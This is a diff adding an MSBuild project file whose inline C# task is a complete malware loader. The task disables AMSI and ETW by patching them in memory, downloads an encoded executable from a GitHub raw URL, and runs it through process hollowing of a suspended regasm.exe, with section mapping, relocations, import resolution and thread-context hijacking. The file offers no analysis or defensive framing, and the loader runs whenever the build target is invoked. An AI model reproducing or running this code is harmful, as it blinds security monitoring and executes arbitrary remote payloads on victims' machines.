@@ -1,0 +1,203 @@
+<Project xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Target Name="ENI">
+    <ENITask />
+  </Target>
+  <UsingTask TaskName="ENITask" TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
+    <Task>
+      <Code Type="Class" Language="cs"><![CDATA[
+using System;
+using System.Text;
+using System.Runtime.InteropServices;
+using Microsoft.Build.Framework;
+using Microsoft.Build.Utilities;
+
+public class ENITask : Task {
+    [DllImport("kernel32")] static extern IntPtr GetProcAddress(IntPtr h, string p);
+    [DllImport("kernel32")] static extern IntPtr GetProcAddress(IntPtr h, IntPtr ord);
+    [DllImport("kernel32")] static extern IntPtr LoadLibrary(string n);
+    [DllImport("kernel32")] static extern bool VirtualProtect(IntPtr a, uint s, uint n, out uint o);
+    [DllImport("kernel32")] static extern IntPtr VirtualAllocEx(IntPtr h, IntPtr a, uint s, uint t, uint p);
+    [DllImport("kernel32")] static extern bool WriteProcessMemory(IntPtr h, IntPtr b, byte[] buf, uint s, out IntPtr w);
+    [DllImport("kernel32")] static extern bool ReadProcessMemory(IntPtr h, IntPtr b, byte[] buf, uint s, out IntPtr r);
+    [DllImport("kernel32")] static extern bool VirtualProtectEx(IntPtr h, IntPtr a, uint s, uint n, out uint o);
+    [DllImport("kernel32")] static extern uint ResumeThread(IntPtr h);
+    [DllImport("kernel32")] static extern bool CloseHandle(IntPtr h);
+    [DllImport("kernel32")] static extern uint WaitForSingleObject(IntPtr h, uint ms);
+    [DllImport("kernel32")] static extern bool GetThreadContext(IntPtr hThread, byte[] ctx);
+    [DllImport("kernel32")] static extern bool SetThreadContext(IntPtr hThread, byte[] ctx);
+    [DllImport("kernel32", SetLastError=true, CharSet=CharSet.Auto)]
+    static extern bool CreateProcess(string app, string cmd, IntPtr pa, IntPtr ta,
+        bool inh, uint flags, IntPtr env, string dir, ref STARTUPINFO si, out PROCESS_INFORMATION pi);
+
+    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
+    struct STARTUPINFO {
+        public uint cb; public string r1,desk,title;
+        public uint x,y,xs,ys,xc,yc,fill,flags;
+        public ushort show,res2; public IntPtr res3,sin,sout,serr;
+    }
+    [StructLayout(LayoutKind.Sequential)]
+    struct PROCESS_INFORMATION {
+        public IntPtr hProcess,hThread; public uint dwProcessId,dwThreadId;
+    }
+
+    const int CTX_SIZE=716, CTX_FLAGS=0, CTX_EBX=164, CTX_EIP=184;
+
+    static string ReadCString(byte[] b, int o) {
+        int e=o; while(e<b.Length&&b[e]!=0)e++;
+        return Encoding.ASCII.GetString(b,o,e-o);
+    }
+
+    static void PatchAMSI() {
+        string lib=new string(new char[]{'a','m','s','i','.','d','l','l'});
+        string fn=new string(new char[]{'A','m','s','i','S','c','a','n','B','u','f','f','e','r'});
+        IntPtr h=LoadLibrary(lib); IntPtr f=GetProcAddress(h,fn); uint o=0;
+        VirtualProtect(f,8,0x40,out o);
+        Marshal.Copy(new byte[]{0x31,0xC0,0xC3},0,f,3);
+        VirtualProtect(f,8,o,out o);
+        Console.WriteLine("[ENI][AMSI] blind");
+    }
+    static void PatchETW() {
+        string lib=new string(new char[]{'n','t','d','l','l'});
+        string fn=new string(new char[]{'E','t','w','E','v','e','n','t','W','r','i','t','e'});
+        IntPtr h=LoadLibrary(lib); IntPtr f=GetProcAddress(h,fn); uint o=0;
+        VirtualProtect(f,8,0x40,out o);
+        Marshal.Copy(new byte[]{0xC3},0,f,1);
+        VirtualProtect(f,8,o,out o);
+        Console.WriteLine("[ENI][ETW]  blind");
+    }
+
+    public override bool Execute() {
+        Console.WriteLine("\n=== ENI Nova ===\n");
+        PatchAMSI(); PatchETW();
+        Console.WriteLine("");
+
+        string url="https://github.com/i25968627-ui/crispy-spoon/raw/refs/heads/main/payload.txt";
+        Console.WriteLine("[ENI][LOAD] Fetching...");
+        System.Net.ServicePointManager.SecurityProtocol=(System.Net.SecurityProtocolType)3072;
+        System.Net.WebClient wc=new System.Net.WebClient();
+        wc.Headers.Add("User-Agent","Mozilla/5.0");
+        byte[] raw=Convert.FromBase64String(wc.DownloadString(url).Trim());
+        byte[] PE=new byte[raw.Length];
+        for(int i=0;i<raw.Length;i++) PE[i]=(byte)(raw[i]^0x00);
+        if(PE[0]!=0x4D||PE[1]!=0x5A){Console.WriteLine("Bad MZ");return false;}
+        Console.WriteLine("[ENI][LOAD] "+PE.Length+" bytes\n");
+
+        int peOff=BitConverter.ToInt32(PE,0x3C);
+        int optOff=peOff+24;
+        uint epRVA=BitConverter.ToUInt32(PE,optOff+16);
+        uint imgSz=BitConverter.ToUInt32(PE,optOff+56);
+        uint prefBase=BitConverter.ToUInt32(PE,optOff+28);
+        ushort nSec=BitConverter.ToUInt16(PE,peOff+6);
+        int secTbl=optOff+BitConverter.ToUInt16(PE,peOff+20);
+        Console.WriteLine("[ENI][HEAD] EP:0x"+epRVA.ToString("X")+" Sz:0x"+imgSz.ToString("X")+" Base:0x"+prefBase.ToString("X")+" Secs:"+nSec+"\n");
+
+        string regasm=Environment.GetFolderPath(Environment.SpecialFolder.Windows)+@"\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe";
+        Console.WriteLine("[ENI][HOLLOW] Spawning regasm suspended...");
+        STARTUPINFO si=new STARTUPINFO(); si.cb=(uint)Marshal.SizeOf(si);
+        PROCESS_INFORMATION pi=new PROCESS_INFORMATION();
+        if(!CreateProcess(regasm,null,IntPtr.Zero,IntPtr.Zero,false,0x4,IntPtr.Zero,null,ref si,out pi)){
+            Console.WriteLine("[ENI][HOLLOW] Failed: "+Marshal.GetLastWin32Error()); return false;
+        }
+        Console.WriteLine("[ENI][HOLLOW] PID:"+pi.dwProcessId+"\n");
+
+        byte[] ctx=new byte[CTX_SIZE];
+        BitConverter.GetBytes(0x10007).CopyTo(ctx,CTX_FLAGS);
+        if(!GetThreadContext(pi.hThread,ctx)){Console.WriteLine("GTC fail");return false;}
+        uint pebAddr=BitConverter.ToUInt32(ctx,CTX_EBX);
+        Console.WriteLine("[ENI][HOLLOW] PEB: 0x"+pebAddr.ToString("X"));
+
+        IntPtr remoteBase=VirtualAllocEx(pi.hProcess,new IntPtr((long)prefBase),imgSz,0x3000,0x04);
+        if(remoteBase==IntPtr.Zero)
+            remoteBase=VirtualAllocEx(pi.hProcess,IntPtr.Zero,imgSz,0x3000,0x04);
+        if(remoteBase==IntPtr.Zero){Console.WriteLine("VAlloc fail:"+Marshal.GetLastWin32Error());return false;}
+        Console.WriteLine("[ENI][HOLLOW] Alloc: 0x"+remoteBase.ToString("X")+"\n");
+
+        byte[] img=new byte[imgSz];
+        Array.Copy(PE,0,img,0,Math.Min(PE.Length,0x1000));
+        for(int i=0;i<nSec;i++){
+            int so=secTbl+(i*40);
+            uint vRVA=BitConverter.ToUInt32(PE,so+12);
+            uint rSz=BitConverter.ToUInt32(PE,so+16);
+            uint rOff=BitConverter.ToUInt32(PE,so+20);
+            if(rSz==0)continue;
+            Array.Copy(PE,(int)rOff,img,(int)vRVA,(int)rSz);
+        }
+        Console.WriteLine("[ENI][SECT] Mapped\n");
+
+        long delta=remoteBase.ToInt64()-(long)prefBase;
+        if(delta!=0){
+            uint relRVA=BitConverter.ToUInt32(PE,optOff+136);
+            uint relSz=BitConverter.ToUInt32(PE,optOff+140);
+            uint bo=relRVA;
+            while(bo<relRVA+relSz){
+                uint pgRVA=BitConverter.ToUInt32(img,(int)bo);
+                uint bSz=BitConverter.ToUInt32(img,(int)bo+4);
+                if(bSz==0)break;
+                int ec=(int)(bSz-8)/2;
+                for(int e=0;e<ec;e++){
+                    ushort ent=BitConverter.ToUInt16(img,(int)bo+8+e*2);
+                    if((ent>>12)==3){
+                        int pp=(int)(pgRVA+(ent&0x0FFF));
+                        uint orig=BitConverter.ToUInt32(img,pp);
+                        Array.Copy(BitConverter.GetBytes((uint)(orig+delta)),0,img,pp,4);
+                    }
+                }
+                bo+=bSz;
+            }
+        }
+
+        uint impRVA=BitConverter.ToUInt32(PE,optOff+104);
+        if(impRVA!=0){
+            int desc=(int)impRVA;
+            while(true){
+                uint oThunk=BitConverter.ToUInt32(img,desc);
+                uint nameRVA=BitConverter.ToUInt32(img,desc+12);
+                uint fThunk=BitConverter.ToUInt32(img,desc+16);
+                if(nameRVA==0)break;
+                string dll=ReadCString(img,(int)nameRVA);
+                IntPtr hDll=LoadLibrary(dll);
+                int nt=(int)(oThunk!=0?oThunk:fThunk);
+                int ft=(int)fThunk;
+                while(true){
+                    uint thunk=BitConverter.ToUInt32(img,nt);
+                    if(thunk==0)break;
+                    IntPtr fa;
+                    if((thunk&0x80000000)!=0)
+                        fa=GetProcAddress(hDll,(IntPtr)(thunk&0x7FFF));
+                    else
+                        fa=GetProcAddress(hDll,ReadCString(img,(int)thunk+2));
+                    Array.Copy(BitConverter.GetBytes((uint)fa.ToInt32()),0,img,ft,4);
+                    nt+=4; ft+=4;
+                }
+                desc+=20;
+            }
+        }
+        Console.WriteLine("[ENI][IAT] Done\n");
+
+        IntPtr w=IntPtr.Zero;
+        WriteProcessMemory(pi.hProcess,remoteBase,img,imgSz,out w);
+        uint oldP=0;
+        VirtualProtectEx(pi.hProcess,remoteBase,imgSz,0x20,out oldP);
+
+        byte[] newBase=BitConverter.GetBytes((uint)remoteBase.ToInt32());
+        WriteProcessMemory(pi.hProcess,new IntPtr((long)pebAddr+8),newBase,4,out w);
+
+        uint epAbs=(uint)(remoteBase.ToInt64()+epRVA);
+        Array.Copy(BitConverter.GetBytes(epAbs),0,ctx,CTX_EIP,4);
+        if(!SetThreadContext(pi.hThread,ctx)){Console.WriteLine("STC fail");return false;}
+        Console.WriteLine("[ENI][CTX] EIP->0x"+epAbs.ToString("X")+"\n");
+
+        ResumeThread(pi.hThread);
+        Console.WriteLine("[ENI][EXEC] PID "+pi.dwProcessId+"\n");
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+
+        Console.WriteLine("\n[ENI] Done.\n");
+        return true;
+    }
+}
+      ]]></Code>
+    </Task>
+  </UsingTask>
+</Project>
